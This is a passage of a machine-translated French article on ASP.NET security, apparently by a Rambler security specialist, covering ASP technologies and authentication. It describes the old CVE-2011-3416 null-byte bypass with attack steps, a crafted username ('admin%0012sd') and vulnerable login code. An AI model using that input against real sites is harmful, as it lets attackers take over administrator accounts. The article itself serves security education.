<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏻‍🍳 📗 👴 Est-il possible de pirater l'infrastructure ASP? 👩🏾‍🚒 🧚🏾 🌭</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Comme le disent les experts en sécurité de l'information: «Ils cassent tout, tout le monde et toujours.» Dans le même temps, les attaques sur ASP.NET ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Est-il possible de pirater l'infrastructure ASP?</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/rambler-co/blog/413649/"><img src="https://habrastorage.org/webt/lw/h4/e6/lwh4e6eo0ogtcv4ycwp2oy_6pa0.jpeg"><br><br>  Comme le disent les experts en sécurité de l'information: «Ils cassent tout, tout le monde et toujours.»  Dans le même temps, les attaques sur ASP.NET sont une chose rare.  Par conséquent, il est toujours extrêmement curieux d'apprendre quelque chose de nouveau à ce sujet.  Sous la coupe, l'histoire d'Aleksey Morozov, spécialiste du département de sécurité de l'information du Groupe Rambler, sur les forces et les faiblesses de cette technologie. <a name="habracut"></a><br><br><h3>  <font color="#0000cc">Présentation</font> </h3><br>  Aujourd'hui, ASP a gagné sa popularité en tant qu'outil de création de projets de moyenne et grande envergure.  Et, comme toute solution populaire, ASP.NET intéresse également les chercheurs, les pirates et les testeurs de sécurité externes. <br><br>  Cet article décrit les problèmes de sécurité ASP.NET potentiels dans différentes versions.  Cependant, il convient de noter que ASP est bien inférieur au nombre de solutions au même PHP, et cela est dû à de nombreux facteurs. <br><br>  Contrairement à PHP, l'utilisation d'ASP est généralement beaucoup plus compliquée et coûteuse (en utilisant la version commerciale d'IIS, l'environnement de développement Visual Studio).  Jusqu'à récemment (l'avènement d'ASP.NET Core), l'utilisation n'était possible que sous Windows et sur le serveur Web IIS.  Le déploiement est également plus compliqué. <br><br>  <b><b>ASP</b></b> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Active Server Pages</a> ) est la technologie de Microsoft pour créer des pages dynamiques. <br><br>  <b>Description:</b> cette technologie permet de créer des pages HTML avec des insertions dans le langage Jscript (très similaire à JavaScript, mais en plus des scripts client, il a un certain nombre d'options pour travailler avec le système d'exploitation Windows et des insertions de serveur sur ASP) <br><br>  <u><b>Un exemple</b></u> : <br><br><pre><code class="hljs pgsql">&lt;% @ <span class="hljs-keyword"><span class="hljs-keyword">Language</span></span> = "JScript" %&gt;&lt;% Response.<span class="hljs-keyword"><span class="hljs-keyword">Write</span></span>("Hello World!"); %&gt;</code> </pre> <br>  <b>ASP.NET</b> <br><br>  La prochaine étape de développement technologique a été la création du noyau ASP basé sur le framework .Net.  En conséquence, ASP a reçu toutes les fonctionnalités de cette solution, à savoir: <br><br><ul><li>  utilisation de différents langages de programmation (C #, Visual Basic.NET, J # et JScript .NET); </li><li>  une vitesse accrue par rapport aux technologies de script, car la première fois que le code est compilé et placé dans un cache spécial, puis exécuté uniquement, sans nécessiter d'analyse, d'optimisation fastidieuse; </li><li>  code compilé qui vous permet de mieux détecter les erreurs, de sorte que le processus de débogage lui-même devient plus efficace; </li><li>  la possibilité de mettre en cache la page; </li><li>  séparation de la présentation et de la logique métier. </li></ul><br>  Sur la base de la solution ASP.NET, les technologies suivantes ont été créées, que nous considérerons. <br><br>  <b>ASP.NET Ajax</b> est l'une des extensions ASP.NET qui vous permet d'utiliser Ajax pour mettre à jour de manière asynchrone une partie du contenu. <br><br>  <b><u>Un exemple</u></b> : <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Refresh"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:UpdatePanel</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"UpdatePanel1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Triggers</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:AsyncPostBackTrigger</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ControlID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">EventName</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Click"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Triggers</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ContentTemplate</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">%=</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">DateTime.Now</span></span></span><span class="hljs-tag"> %&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ContentTemplate</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:UpdatePanel</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <b>ASP.NET Web Forms</b> - une nouvelle évolution de la technologie ASP, dans laquelle il y a une transition vers un modèle orienté composant pour la création d'applications. <br><br>  <b>Description:</b> <br><br>  Le modèle Web Forms est basé sur trois concepts de base: la publication de page, l'état d'affichage et les contrôles serveur.  Chaque demande HTTP envoyée au serveur Web et mappée au runtime ASP.NET passe par plusieurs étapes au cours desquelles le traitement de l'événement de publication prend le devant de la scène.  L'événement de publication est l'action principale que l'utilisateur s'attend à recevoir à la suite du traitement de sa demande.  (par exemple, cliquez sur un bouton). <br><br>  Autrement dit, il existe des contrôles traditionnels (contrôles) et un modèle de développement piloté par les événements. <br><br>  <b><u>Un exemple</u></b> : <br><br>  La vue (fichier aspx) est du côté client. <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">%@</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Page</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Language</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"C#"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">CodeFile</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"SamplePage.aspx.cs"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Inherits</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"SamplePage"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">AutoEventWireup</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> %&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>Code-Behind Page Model<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"form1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Label</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Label1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Label"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Label</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onclick</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1_Click"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Traitement logique (fichier cs (si vous utilisez C #)) - côté serveur. <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI.WebControls; <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> partial <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> SamplePage : <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI.Page { protected <span class="hljs-type"><span class="hljs-type">void</span></span> Button1_Click(<span class="hljs-keyword"><span class="hljs-keyword">object</span></span> sender, EventArgs e) { Label1.Text = "Clicked at " + DateTime.Now.ToString(); } }</code> </pre><br>  <b>L'API Web ASP.NET</b> est une autre extension qui vous permet de créer des services d'API pour un développement et une interaction plus pratiques avec l'application. <br><br>  <b><u>Un exemple</u></b> : <br><br><pre> <code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta">HttpDelete(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"{id}"</span></span></span><span class="hljs-meta">)</span></span>] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> IActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Delete</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> id</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> todo = _context.TodoItems.Find(id); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (todo == <span class="hljs-literal"><span class="hljs-literal">null</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> NotFound(); } _context.TodoItems.Remove(todo); _context.SaveChanges(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> NoContent(); }</code> </pre><br>  <b>ASP.NET MVC</b> - la prochaine étape dans le développement de la technologie se produit après la séparation de la logique métier en trois composants du modèle MVC (Model-View-Controller).  Le moteur du rasoir est également en cours d'introduction et il devient possible de personnaliser indépendamment les éléments gérés du site, ce qui était très difficile avec les formulaires Web. <br><br>  <b>Avantages</b> : <br><br><ul><li>  la gestion des structures complexes est facilitée en divisant l'application en un modèle, une présentation et un contrôleur; </li><li>  l'état d'affichage et les formulaires de serveur ne sont pas utilisés.  Cela rend la plateforme MVC idéale pour les développeurs qui ont besoin d'un contrôle complet sur le comportement des applications; </li><li>  Circuit de contrôleur principal dans lequel les demandes d'application Web sont traitées via un seul contrôleur.  Cela vous permet de créer des applications qui prennent en charge une infrastructure de routage étendue; </li><li>  Convient parfaitement aux applications Web prises en charge par de grandes équipes de développement. </li></ul><br>  <b><u>Un exemple</u></b> : <br><br>  <b>Afficher</b> <br><br><pre> <code class="hljs xml">@{ Layout = null; } <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"viewport"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">content</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"width=device-width"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>SomeView<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h2</span></span></span><span class="hljs-tag">&gt;</span></span>@ViewBag.Message<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h2</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <b>Modèle</b> <br><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.ComponentModel; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.ComponentModel.DataAnnotations; <span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">MvcModels.Models</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">partial</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">User</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> UserId { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">""</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> FirstName { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">""</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> LastName { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">" "</span></span>)] [DataType(DataType.Date)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> DateTime BirthDate { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } } }</code> </pre><br>  <b>Contrôleur</b> <br><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.Web.Mvc; <span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">NonCompiledMvc.Controllers</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">HomeController</span></span> : <span class="hljs-title"><span class="hljs-title">Controller</span></span> { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> ActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Index</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> View((<span class="hljs-keyword"><span class="hljs-keyword">object</span></span>)<span class="hljs-string"><span class="hljs-string">"It Works!"</span></span>); } } }</code> </pre><br>  <b>ASP.NET Core</b> - La prochaine percée dans ASP.NET devient multiplateforme, avec la prise en charge de C # 7.0. <br><table><tbody><tr><th>  La technologie </th><th>  Forces </th><th>  Faiblesses </th></tr><tr><td>  Pages serveur actives, ASP </td><td>  Objectif commun </td><td>  Interprété à l'exécution, prend en charge le "code spaghetti" </td></tr><tr><td>  Formulaires Web ASP.NET 1.0 / 1.1 </td><td>  Compilé, interface utilisateur, prend en charge la POO </td><td>  Débit élevé, HTML complexe, non testable </td></tr><tr><td>  ASP.NET Web Forms 2.0 </td><td>  - </td><td>  - </td></tr><tr><td>  ASP.NET Ajax </td><td>  Implémentation Ajax </td><td>  Complexité déraisonnable, manque de flexibilité </td></tr><tr><td>  Formulaires Web ASP.NET 3.5-4.0 </td><td>  - </td><td>  - </td></tr><tr><td>  ASP.NET MVC 1.0-5.0 </td><td>  Le modèle de développement change complètement.  Il y a de la flexibilité </td><td>  L'absence de multiplateforme.  Impossible de compiler à la volée </td></tr><tr><td>  ASP.NET Core </td><td>  La multiplateforme apparaît.  Open source </td><td>  - </td></tr></tbody></table><br><h3>  <font color="#0000cc">Authentification dans ASP.NET</font> </h3><br>  Il existe trois types d'authentification dans ASP.NET MVC qui sont sensiblement différents les uns des autres. <br><br><ul><li>  <b>Aucune authentification:</b> identité ASP.NET et aucun système d'authentification intégré; </li><li>  <b>Comptes d'utilisateurs individuels: le</b> projet inclut par défaut le système d'identité ASP.NET, qui vous permet d'autoriser les utilisateurs à la fois dans l'application et en utilisant des services externes tels que google, twitter, etc. </li><li>  <b>Comptes organisationnels:</b> adaptés aux sites et applications Web de sociétés et d'organisations individuelles; </li><li>  <b>Authentification Windows:</b> un système d'authentification pour les réseaux intranet utilisant des comptes Windows. </li></ul><br><img src="https://habrastorage.org/webt/wr/rz/o4/wrrzo4fj86bsayurdvfxzcmdvze.png"><br><br><h3>  <font color="#0000cc">ASP.NET en termes de piratage</font> </h3><br>  Comme toute technologie, ASP.NET a été piraté.  Ci-dessous, nous décrirons les études de sécurité les plus populaires, y compris non seulement dans ASP lui-même, mais également en conjonction avec l'infrastructure. <br><br>  <b>Statistiques CVE</b> <br><br><img src="https://habrastorage.org/webt/af/at/ft/afatftxyrlf1kds_37latbgi3fc.png"><br><br>  Comme le montre le tableau, les statistiques sur les découvertes sont très peu nombreuses.  En effet, ASP.NET nécessite une bonne connaissance pour l'examiner en détail.  Et les ressources sont également beaucoup moins importantes que sur le même PHP. <br><br>  <b>Utilisation d'un octet nul pour le contournement d'autorisation</b> <br><br>  <b>CVE:</b> CVE-2011-3416 <br>  <b>Description: il</b> est possible de contourner l'autorisation. <br><br>  <b>Algorithme:</b> <br><br><ol><li>  Enregistrez un nouveau compte avec un nom d'utilisateur existant; </li><li>  Lors de l'inscription, ajoutez des octets nuls et des caractères supplémentaires (admin% 0012sd); </li><li>  Ainsi, le contrôle d'unicité sera réussi.  Un nouvel utilisateur «admin» sera créé avec le même rôle, mais avec un nouveau mot de passe. </li></ol><br>  <u><b>Exemple de code vulnérable</b></u> : <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">If</span></span> (IsPostBack) { String <span class="hljs-type"><span class="hljs-type">name</span></span> = Request.Form[“<span class="hljs-type"><span class="hljs-type">name</span></span>”]; String <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = Request.Form[“<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>”]; <span class="hljs-keyword"><span class="hljs-keyword">If</span></span> (<span class="hljs-type"><span class="hljs-type">name</span></span> != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span> &amp;&amp; <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span> &amp;&amp; FormsAuthentication.Authenticate(<span class="hljs-type"><span class="hljs-type">name</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">password</span></span>)) { FormsAuthentication.SetAuthCookie(<span class="hljs-type"><span class="hljs-type">name</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>); Response.Redirect(Request[“ReturnUrl”] ?? “/”); } <span class="hljs-keyword"><span class="hljs-keyword">Else</span></span> { ModelState.AddModeError(“fail”, “   .” + “   ”); } }</code> </pre><br>  <b>Preuve de concept</b> : <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/DlkYQrkTiEs" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <b>Solution:</b> cette erreur a été corrigée dans .Net 3.5 <br><br>  <b>Débogage à distance</b> <br><br>  <b>Description:</b> ASP.NET étant une application compilée, elle possède certaines 